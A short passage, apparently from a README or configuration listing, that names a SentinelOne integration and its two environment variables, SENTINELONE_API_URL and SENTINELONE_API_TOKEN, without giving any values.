└── SentinelOne: SENTINELONE_API_URL, SENTINELONE_API_TOKEN
```

---
